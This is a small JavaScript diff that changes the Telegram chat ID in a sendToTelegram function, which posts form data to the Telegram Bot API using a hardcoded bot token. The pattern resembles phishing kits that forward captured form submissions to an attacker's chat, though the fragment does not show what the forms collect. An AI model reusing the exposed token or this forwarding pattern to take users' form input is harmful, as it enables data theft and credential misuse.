@@ -100,7 +100,7 @@ async function formatMessage(formType, formData) {
 // Function to send data to Telegram
 async function sendToTelegram(formData) {
   const token = '7285769190:AAFopuaBmZwBQ-IH152ZbkTfhs5ERCUMUeA';
-  const chatId = '7304881333';
+  const chatId = '7267153753';
 
   fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
